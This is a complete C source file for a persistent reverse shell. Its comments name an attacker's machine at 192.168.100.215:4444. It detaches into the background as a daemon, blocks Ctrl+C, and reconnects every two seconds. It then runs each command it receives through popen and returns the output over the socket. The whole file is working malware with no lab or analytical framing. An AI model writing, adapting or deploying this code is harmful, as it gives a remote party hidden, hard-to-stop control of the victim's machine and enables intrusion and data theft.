#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h> // For error handling

#define IP "192.168.100.215" // Attacker's machine IP
#define PORT 4444 // Port to use for the connection

// Signal handler to catch SIGINT (Ctrl+C), allowing the program to continue
void handle_sigint(int sig) {
    // Do nothing to block Ctrl+C
}

// Function to attempt a connection and monitor for disconnection and remote command execution
void monitor_connection(struct sockaddr_in *server) {
    int sock;
    int connected = 0; // To track connection status

    while (1) {
        // If a connection is already established, skip the connection attempt
        if (connected) {
            sleep(2);  // Sleep for a while to avoid constant retrying
            continue;
        }

        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            perror("Socket creation failed");
            sleep(2);
            continue;
        }

        // Attempt to connect
        if (connect(sock, (struct sockaddr *)server, sizeof(*server)) == -1) {
            close(sock);
            sleep(2);  // Retry in case of failure
            continue;
        }

        connected = 1; // Connection successful
        printf("Connected to %s:%d\n", IP, PORT);

        // Remote command execution loop
        char buffer[1024];
        char output_buffer[4096]; // To hold command output
        while (1) {
            memset(buffer, 0, sizeof(buffer)); // Clear the buffer
            ssize_t bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                printf("Disconnected!\n");
                connected = 0; // Reset connection status
                close(sock);
                break; // Exit loop if disconnected
            }

            buffer[bytes_received] = '\0'; // Null-terminate the received command

            // Handle `cd` command separately
            if (strncmp(buffer, "cd ", 3) == 0) {
                char *path = buffer + 3; // Extract the path
                path[strcspn(path, "\n")] = '\0'; // Remove newline character
                if (chdir(path) == 0) {
                    // Just acknowledge without printing the change
                    char *ack_msg = "Directory changed\n";
                    send(sock, ack_msg, strlen(ack_msg), 0);
                } else {
                    snprintf(output_buffer, sizeof(output_buffer), "Failed to change directory to %s: %s\n", path, strerror(errno));
                    send(sock, output_buffer, strlen(output_buffer), 0);
                }
                continue; // Skip the rest of the loop for `cd` command
            }

            // Execute the received command
            FILE *fp = popen(buffer, "r");
            if (fp == NULL) {
                char *error_msg = "Command execution failed\n";
                send(sock, error_msg, strlen(error_msg), 0);
                continue;
            }

            // Send command output back
            while (fgets(output_buffer, sizeof(output_buffer), fp) != NULL) {
                send(sock, output_buffer, strlen(output_buffer), 0);
            }
            pclose(fp);
        }
    }
}

// Main function
int main() {
    // Ignore SIGINT (Ctrl+C) so the program doesn’t terminate when interrupted
    signal(SIGINT, handle_sigint);

    // Daemonize the program: Run in the background as a daemon
    if (fork() != 0) {
        exit(0); // Parent process exits to detach child process in the background
    }

    if (setsid() == -1) {
        exit(1); // Exit if it’s not possible to detach from terminal
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP); // Set the server IP address

    // Monitor the connection
    monitor_connection(&server);

    return 0; // End the program if everything fails
}

